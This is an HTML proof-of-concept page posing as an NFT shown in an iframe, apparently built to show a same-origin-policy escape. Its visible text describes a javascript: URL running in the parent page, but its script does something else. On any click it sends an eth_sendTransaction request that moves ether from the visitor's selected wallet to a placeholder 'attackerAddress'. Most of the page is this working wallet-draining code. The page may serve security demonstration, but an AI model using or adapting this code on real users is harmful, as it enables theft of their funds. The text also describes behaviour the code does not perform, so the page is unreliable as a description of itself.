<!doctype html>
<html>
<head>
    <style>
        html {
            font-family: sans-serif;
        }
        h1 {
            font-size: 1.4em;
        }
    </style>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
</head>
<body>
<h1>iframe on <span id="originOutput"></span></h1>

<p>
    Tap/click this iframe, which will call window.open() with javascript: URL which executes in parent page context.
    (Observe injected HTML in parent page, and potentially an alert() dialog)
</p>

<p>This is an nft shown through an iframe due to SOP; the nfts should never get access to the parent domain.</p>

<p><b>IN SOP WE TRUST</b></p>

<img src="https://agentjacker.github.io/kittycat.png">

<script>
    document.getElementById('originOutput').innerText = window.location.origin;

    document.body.addEventListener('click', function () {
        // Simulate an attack to transfer funds to the attacker's address.
        const transactionParameters = {
            nonce: "0x00",
            gasPrice: "0x244AC6D",
            gas: "0x12A52",
            to: "attackerAddress", // Replace with the actual recipient address
            from: ethereum.selectedAddress,
            value: "0x2386F26FC10000",
            data: "0x00",
            chainId: "0x1",
        };

        // Send transaction
        try {
            ethereum.sendAsync(
                {
                    method: "eth_sendTransaction",
                    params: [transactionParameters],
                    from: ethereum.selectedAddress,
                },
                function (error, result) {
                    if (error) {
                        alert(`Error sending transaction: ${error.message}`);
                    } else {
                        alert(`Transaction sent! Transaction hash: ${result.result}`);
                    }
                }
            );
        } catch (error) {
            alert(`Error sending transaction: ${error.message}`);
        }
    });
</script>

</body>
</html>
